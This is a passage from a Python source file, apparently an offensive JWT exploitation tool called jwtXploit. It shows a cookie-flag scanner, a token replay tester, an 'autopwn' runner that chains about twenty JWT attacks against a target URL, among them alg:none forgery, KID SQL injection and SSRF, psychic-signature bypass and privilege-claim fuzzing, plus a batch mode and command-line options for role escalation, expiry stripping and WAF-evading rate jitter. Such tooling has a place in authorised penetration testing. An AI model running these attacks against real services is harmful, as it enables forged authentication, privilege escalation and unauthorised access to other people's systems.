    print(Fore.CYAN + f"\n[+] Scanning cookie security flags at: {url}")
    _rate_sleep()
    try:
        resp = session.get(url,
                           headers={"Authorization": f"Bearer {token}"},
                           verify=ssl_ver, timeout=timeout)
    except Exception as e:
        print(Fore.RED + f"[!] Request failed: {e}")
        return

    issues = []

    # Scan Set-Cookie headers
    sc_headers = resp.headers.get("Set-Cookie", "") or ""
    for cookie_str in sc_headers.split(","):
        cookie_str = cookie_str.strip()
        if not cookie_str:
            continue
        name = cookie_str.split("=")[0].strip()
        lower = cookie_str.lower()

        if "httponly" not in lower:
            issues.append(("HIGH",    f"Cookie '{name}' missing HttpOnly — XSS can read token"))
        if "secure" not in lower:
            issues.append(("HIGH",    f"Cookie '{name}' missing Secure — token sent over HTTP"))
        if "samesite=none" in lower and "secure" not in lower:
            issues.append(("CRITICAL", f"Cookie '{name}' SameSite=None without Secure — CSRF exposed"))
        if "samesite" not in lower:
            issues.append(("MEDIUM",   f"Cookie '{name}' missing SameSite — potential CSRF risk"))

    # Scan response cookies via requests
    for cookie in resp.cookies:
        if not cookie.has_nonstandard_attr("HttpOnly") and not cookie._rest.get("HttpOnly"):
            issues.append(("HIGH", f"Cookie '{cookie.name}' missing HttpOnly (requests jar check)"))

    # Scan HTML body for localStorage usage
    if "localstorage.setitem" in resp.text.lower():
        issues.append(("HIGH", "localStorage.setItem detected — JWT may be stored client-side (XSS-readable)"))

    if issues:
        sev_color = {"CRITICAL": Fore.RED, "HIGH": Fore.YELLOW, "MEDIUM": Fore.CYAN}
        print(Fore.YELLOW + f"\n[+] Cookie Security Issues Found ({len(issues)}):")
        for sev, msg in issues:
            col = sev_color.get(sev, Fore.WHITE)
            print(col + f"  [{sev}] {msg}")
            finding = {
                "attack":        f"Cookie Security — {msg}",
                "token":         token,
                "payload":       decode_token(token),
                "header":        get_header(token),
                "verified":      True,
                "verify_reason": msg,
                "delivery":      "Cookie header inspection",
                "poc_curl":      f'curl -sv "{url}" -H "Authorization: Bearer {token}" | grep -i set-cookie',
                "timestamp":     time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
            }
            CONFIG["findings"].append(finding)
            _notify_webhook(finding)
    else:
        print(Fore.GREEN + "[+] No cookie security flag issues detected.")


# ──────────────────────────────────────────────────────────────
#  PHASE 8 — ATTACK #21: TOKEN REPLAY DETECTION
# ──────────────────────────────────────────────────────────────

def attack_replay_detect(token, url=None, count=None):
    """
    Token Replay Detection.
    Submits the ORIGINAL valid token N times (default 5) and checks if the
    server accepts all of them. A secure server should reject replays after
    first use (one-time-use nonce, jti claim enforcement, session invalidation).
    Reports per-attempt status and flags if all N succeed (no replay protection).
    """
    if not url:
        if CONFIG.get("autopwn"):
            print(Fore.YELLOW + "[AUTOPWN] No --url — skipping replay detection.")
            return
        url = input(Fore.YELLOW + "[?] Enter target URL for replay test: ").strip()
        if not url:
            return

    n = count or CONFIG.get("replay_count", 5)

    session = requests.Session()
    timeout = CONFIG.get("timeout", 10)
    proxy   = CONFIG.get("proxy")
    ssl_ver = CONFIG.get("ssl_verify", True)
    if proxy:
        session.proxies = {"http": proxy, "https": proxy}

    print(Fore.CYAN + f"\n[+] Replay Detection — submitting token {n} times to: {url}")

    results = []
    for i in range(1, n + 1):
        _rate_sleep()
        try:
            resp = session.get(url,
                               headers={"Authorization": f"Bearer {token}"},
                               verify=ssl_ver, timeout=timeout)
            accepted = resp.status_code in (200, 201, 204)
            results.append(accepted)
            sym = "✅" if accepted else "❌"
            print(Fore.CYAN + f"  [{i}/{n}] {sym} HTTP {resp.status_code}")
        except Exception as e:
            print(Fore.RED + f"  [{i}/{n}] Request error: {e}")
            results.append(False)

    all_accepted = all(results)
    if all_accepted:
        msg = f"Token accepted all {n}/{n} times — NO replay protection detected"
        print(Fore.RED + Style.BRIGHT + f"\n[!] 🔴 VULNERABLE: {msg}")
        finding = {
            "attack":        "JWT Replay Attack",
            "token":         token,
            "payload":       decode_token(token),
            "header":        get_header(token),
            "verified":      True,
            "verify_reason": msg,
            "delivery":      "Authorization: Bearer",
            "poc_curl":      (f'for i in $(seq 1 {n}); do\n'
                              f'  curl -s -o /dev/null -w "%{{http_code}} " '
                              f'"{url}" -H "Authorization: Bearer {token}"\ndone'),
            "timestamp":     time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
        }
        CONFIG["findings"].append(finding)
        _notify_webhook(finding)
    elif any(results):
        accepted_count = sum(results)
        print(Fore.YELLOW + f"\n[~] Partial replay: {accepted_count}/{n} attempts accepted — intermittent protection")
    else:
        print(Fore.GREEN + f"\n[+] Replay-safe: token rejected after first use ✅")


def run_autopwn(token, url, wordlist=None):
    """Run all automatable attack vectors non-interactively and test each against URL."""
    if not url:
        url = input(Fore.YELLOW + "[AUTOPWN] Enter target URL: ").strip()
        if not url:
            print(Fore.RED + "[-] URL required for --autopwn. Exiting.")
            return

    print(Fore.YELLOW + "\n" + "\u2550" * 64)
    print(Fore.YELLOW + "  \U0001f916  AUTOPWN MODE \u2014 Testing all automatable attack vectors")
    print(Fore.YELLOW + "\u2550" * 64)
    if CONFIG.get("escalate_role"):
        print(Fore.CYAN + f"[*] Role escalation target : '{CONFIG['escalate_role']}'")
    if CONFIG.get("strip_exp"):
        print(Fore.CYAN + "[*] exp/nbf stripping      : ENABLED")
    print()

    autopwn_attacks = [
        ("Null Signature",              attack_null_signature),
        ("Unverified Signature",        attack_unverified_signature),
        ("alg:none \u2014 7 variants",  attack_flawed_verification),
        ("JWK Header Injection",        attack_jwk_header_injection),
        ("JKU Header Injection",        attack_jku_header_injection),
        ("KID Path Traversal",          attack_kid_traversal),
        ("KID SQL Injection",           attack_kid_sqli),
        ("KID SSRF",                    attack_kid_ssrf),
        ("ES256 Psychic Signature",     attack_es256_psychic_signature),
        ("Library Fingerprint",         fingerprint_jwt_library),
        ("x5c Header Injection",        attack_x5c_injection),
        ("typ/cty Header Mutation",     attack_typ_cty_mutation),
        ("JWKS Key Discovery Confusion",attack_jwks_discovery),
        ("Claim Fuzzing",               attack_claim_fuzz),
        ("ES384/ES512 Psychic Sig",     attack_es384_es512_psychic),
        ("PS256 PSS Blinding",          attack_ps256_blinding),
        ("Cookie Security Flags",       attack_cookie_security),
        ("Replay Detection",            attack_replay_detect),
    ]
    if wordlist:
        autopwn_attacks.append(
            ("Weak Key Brute Force", lambda t, u: attack_weak_signing_key(t, wordlist, u))
        )

    for name, fn in autopwn_attacks:
        print(Fore.CYAN + f"\n{chr(9472) * 64}")
        print(Fore.CYAN + f"[AUTOPWN] \u25b6  {name}")
        print(Fore.CYAN + f"{chr(9472) * 64}")
        try:
            fn(token, url)
        except Exception as e:
            print(Fore.RED + f"[AUTOPWN] \u2717  {name} \u2014 error: {e}")

    print(Fore.YELLOW + f"\n{chr(9552) * 64}")
    print(Fore.YELLOW + "[AUTOPWN] Scan complete.")
    print(Fore.YELLOW + "[AUTOPWN] Skipped (require manual input):")
    print(Fore.YELLOW + "   ↷ Algorithm Confusion  (needs key file or second token for sig2n)")
    print(Fore.YELLOW + f"{chr(9552) * 64}\n")


# ──────────────────────────────────────────────────────────────
#  BATCH MODE ENGINE
# ──────────────────────────────────────────────────────────────

def _parse_batch_line(line):
    """
    Parse one line from a batch file.
    Accepted formats:
        token                    → (token, None)
        token::https://url.com   → (token, url)
        token https://url.com    → (token, url)   (space separated)
    Returns None for blank lines and comment lines starting with #.
    """
    line = line.strip()
    if not line or line.startswith("#"):
        return None
    if "::" in line:
        parts = line.split("::", 1)
        return parts[0].strip(), parts[1].strip() or None
    parts = line.split(None, 1)
    if len(parts) == 2 and parts[1].startswith("http"):
        return parts[0], parts[1]
    return line, None


def run_batch(batch_file, wordlist=None):
    """
    Read a batch file of tokens (one per line) and run full autopwn on each.
    Lines can be:
        <token>
        <token>::<url>
        <token> <url>
        # comment lines are skipped
    All findings accumulate into CONFIG['findings'] for a single combined report.
    """
    try:
        with open(batch_file, encoding="utf-8") as fh:
            raw_lines = fh.readlines()
    except FileNotFoundError:
        print(Fore.RED + f"[!] Batch file not found: {batch_file}")
        sys.exit(1)

    entries = [_parse_batch_line(l) for l in raw_lines]
    entries = [e for e in entries if e is not None]

    if not entries:
        print(Fore.RED + "[!] Batch file is empty or contains only comments.")
        sys.exit(1)

    print(Fore.YELLOW + "\n" + "═" * 64)
    print(Fore.YELLOW + f"  📋  BATCH MODE — {len(entries)} token(s) loaded from '{batch_file}'")
    print(Fore.YELLOW + "═" * 64)

    for idx, (token, url) in enumerate(entries, 1):
        print(Fore.CYAN + f"\n{'─'*64}")
        print(Fore.CYAN + f"  [BATCH {idx}/{len(entries)}]  Token: {token[:40]}...")
        if url:
            print(Fore.CYAN + f"               URL:   {url}")
        print(Fore.CYAN + f"{'─'*64}")

        # Reset per-token state that shouldn't bleed between items
        CONFIG["original_token"] = token

        # Run secrets scan + recommender silently per token
        scan_token_secrets(token)
        hdr = get_header(token)
        pay = decode_token(token)
        recommend_attacks(hdr, pay)
        print()

        run_autopwn(token, url, wordlist=wordlist)

    confirmed = sum(1 for f in CONFIG["findings"] if f.get("verified"))
    print(Fore.YELLOW + "\n" + "═" * 64)
    print(Fore.YELLOW + f"  BATCH COMPLETE  |  {len(entries)} tokens  |  {len(CONFIG['findings'])} tokens generated  |  {confirmed} confirmed accepted")
    print(Fore.YELLOW + "═" * 64)


def main():
    print_banner()

    parser = argparse.ArgumentParser(description="JWT Exploitation Tool")
    parser.add_argument("token",              nargs="?", default=None, help="JWT token to test (omit when using --batch or --env)")
    parser.add_argument("-w", "--wordlist",   help="Wordlist path (for weak signing key brute force)")
    parser.add_argument("--url",              help="Target endpoint URL to test tokens against")
    parser.add_argument("--proxy",            help="Proxy URL: http://host:port  |  socks5h://host:port  (socks5h routes DNS through proxy too; needs PySocks)")
    parser.add_argument("--no-ssl-verify",    action="store_true", help="Disable SSL certificate verification")
    parser.add_argument("--timeout",          type=int, default=10, metavar="SEC", help="HTTP request timeout in seconds (default: 10)")
    parser.add_argument("--autopwn",          action="store_true", help="Run ALL automatable attacks non-interactively and test each against --url")
    parser.add_argument("--escalate-role",    metavar="ROLE", help="Auto-set role/admin/sub claims to this value in autopwn/batch (e.g. admin)")
    parser.add_argument("--strip-exp",        action="store_true", help="Remove nbf/iat and push exp 10 years forward before signing every token")
    parser.add_argument("--hashcat",          action="store_true", help="Use GPU hashcat for brute force instead of Python threaded mode")
    parser.add_argument("--decode",           action="store_true", help="Decode and analyse the token without attacking (recon mode)")
    parser.add_argument("--batch",            metavar="FILE", help="Batch file: one token (or token::url) per line — runs autopwn on each")
    parser.add_argument("--sig2n",            metavar="TOKEN2", help="Second RS256 token for sig2n key recovery (attack #14)")
    parser.add_argument("--discover-jwks",    action="store_true", help="Auto-discover JWKS endpoint from --url and run key-confusion")
    parser.add_argument("--key-bits",         type=int, default=2048, metavar="N", help="RSA key size hint for sig2n (default: 2048)")
    parser.add_argument("--rate-limit",       type=float, default=0, metavar="N", help="Max HTTP requests/sec — 0=unlimited. Prevents WAF bans.")
    parser.add_argument("--jitter",           type=float, default=0, metavar="PCT", help="Random ±PCT%% jitter on --rate-limit sleep (e.g. 20)")
    parser.add_argument("--webhook",          metavar="URL", help="POST confirmed findings JSON to this URL (Slack/Discord/custom)")
    parser.add_argument("--quiet",            action="store_true", help="Machine-readable output for CI — suppress banner/color, exit 1 on finding")
    parser.add_argument("--env",              action="store_true", help="Read token from $JWTX_TOKEN, url from $JWTX_URL (keeps secrets out of shell history)")
    parser.add_argument("--claim-fuzz",       action="store_true", help="Fast-track to privilege claim fuzzing (attack #17) — skip menu")
    parser.add_argument("--replay",           action="store_true", help="Fast-track to token replay detection (attack #21)")
    parser.add_argument("--replay-count",     type=int, default=5, metavar="N", help="Number of replay attempts (default: 5)")
    parser.add_argument("-o", "--output",     metavar="FILE", help="Save report to this file after the session")
    parser.add_argument("--format",           choices=["json", "txt", "md", "sarif", "html"], default="json", metavar="FMT", help="Report format: json (default), txt, md, sarif, or html")
    args = parser.parse_args()

    # --env: load token and url from environment variables
    if args.env:
        env_token = os.environ.get("JWTX_TOKEN", "").strip()
        env_url   = os.environ.get("JWTX_URL",   "").strip()
        if not env_token:
            print("ERROR: --env set but $JWTX_TOKEN is empty")
            sys.exit(1)
        args.token = args.token or env_token
        args.url   = args.url   or env_url or None

    # Require either token or --batch
    if not args.token and not args.batch:
        parser.error("provide a token, use --batch FILE, or use --env")

    # Populate global config
    CONFIG["proxy"]          = _validate_proxy(args.proxy)
    CONFIG["ssl_verify"]     = not args.no_ssl_verify
    CONFIG["timeout"]        = args.timeout
    CONFIG["original_token"] = args.token or ""
    CONFIG["autopwn"]        = True if args.batch else args.autopwn
    CONFIG["escalate_role"]  = args.escalate_role
    CONFIG["strip_exp"]      = args.strip_exp
    CONFIG["use_hashcat"]    = args.hashcat
    CONFIG["output_file"]    = args.output
    CONFIG["output_format"]  = args.format
    CONFIG["quiet"]          = args.quiet
    CONFIG["rate_limit"]     = args.rate_limit
    CONFIG["jitter"]         = args.jitter
    CONFIG["webhook"]        = args.webhook
    CONFIG["replay_count"]   = args.replay_count

    if args.quiet:
        print(f"INFO: jwtXploit  token={str(args.token or 'batch')[:30]}...  url={args.url or 'none'}")

    # ── BATCH MODE ───────────────────────────────────────────────
    if args.batch:
        run_batch(args.batch, wordlist=args.wordlist)
        if CONFIG["output_file"]:
            save_report(CONFIG["output_file"], CONFIG["output_format"])
        if CONFIG["quiet"]:
            confirmed = sum(1 for f in CONFIG["findings"] if f.get("verified"))
            sys.exit(1 if confirmed else 0)
        return

    # Always scan payload for embedded secrets on load
    scan_token_secrets(args.token)

    # --decode mode: full recon, then exit
    if args.decode:
        decode_mode(args.token)
        return

    # --discover-jwks: fast-track to JWKS discovery attack
    if args.discover_jwks:
        attack_jwks_discovery(args.token, args.url)
        if CONFIG["output_file"]:
            save_report(CONFIG["output_file"], CONFIG["output_format"])
        return

    # --claim-fuzz: fast-track to privilege claim fuzzing
    if args.claim_fuzz:
        attack_claim_fuzz(args.token, args.url)
        if CONFIG["output_file"]:
            save_report(CONFIG["output_file"], CONFIG["output_format"])
        return

    # --replay: fast-track to token replay detection
    if args.replay:
        attack_replay_detect(args.token, args.url, count=args.replay_count)
        if CONFIG["output_file"]:
            save_report(CONFIG["output_file"], CONFIG["output_format"])
        return

    # Print attack recommendations (always shown)
    header  = get_header(args.token)
    payload = decode_token(args.token)
    recommend_attacks(header, payload)
    print()

    # Autopwn mode — skip menu
    if args.autopwn:
        if args.sig2n:
            attack_sig2n(args.token, args.url, token2=args.sig2n)
        run_autopwn(args.token, args.url, wordlist=args.wordlist)
        if CONFIG["output_file"]:
            save_report(CONFIG["output_file"], CONFIG["output_format"])
        if CONFIG["quiet"]:
            confirmed = sum(1 for f in CONFIG["findings"] if f.get("verified"))
            sys.exit(1 if confirmed else 0)
        return

    attacks = {
        "1":  ("Unverified Signature",                            attack_unverified_signature),
        "2":  ("Flawed Signature Verification (alg:none)",        attack_flawed_verification),
        "3":  ("Weak Signing Key Brute Force",                    lambda t, u: attack_weak_signing_key(t, args.wordlist, u)),
        "4":  ("JWK Header Injection",                            attack_jwk_header_injection),
        "5":  ("JKU Header Injection (auto-hosted JWKS)",         attack_jku_header_injection),
        "6":  ("KID Header Path Traversal",                       attack_kid_traversal),
        "7":  ("Algorithm Confusion (Public Key as HMAC)",        jwt_algorithm_confusion_attack),
        "8":  ("ES256 Psychic Signature Bypass (CVE-2022-21449)", attack_es256_psychic_signature),
        "9":  ("Null Signature (Signature Stripping)",            attack_null_signature),
        "10": ("KID SQL Injection",                               attack_kid_sqli),
        "11": ("KID SSRF",                                        attack_kid_ssrf),
        "12": ("JWT Library Fingerprinting",                      fingerprint_jwt_library),
        "13": ("x5c Header Injection",                            attack_x5c_injection),
        "14": ("sig2n RS256 Key Recovery → HS256 Confusion",     lambda t, u: attack_sig2n(t, u, token2=args.sig2n)),
        "15": ("typ/cty Header Mutation (15 variants)",          attack_typ_cty_mutation),
        "16": ("JWKS Endpoint Discovery + Key Confusion",        attack_jwks_discovery),
        "17": ("Privilege Claim Fuzzing (50+ permutations)",     attack_claim_fuzz),
        "18": ("ES384/ES512 Psychic Signature (CVE-2022-21449)", attack_es384_es512_psychic),
        "19": ("PS256 RSA-PSS Signature Blinding",               attack_ps256_blinding),
        "20": ("JWT Cookie Security Flag Scanner",               attack_cookie_security),
        "21": ("Token Replay Detection",                         attack_replay_detect),
    }

    print(Fore.CYAN + "[*] Choose an attack method:")
    for k, v in attacks.items():
        print(Fore.CYAN + f"  {k:>2}. {v[0]}")
    choice = input(Fore.YELLOW + "\n[?] Enter choice: ").strip()

    if choice in attacks:
        attacks[choice][1](args.token, args.url)
    else:
        print(Fore.RED + "[-] Invalid choice")

    if CONFIG["output_file"]:
        save_report(CONFIG["output_file"], CONFIG["output_format"])

if __name__ == "__main__":
    main()
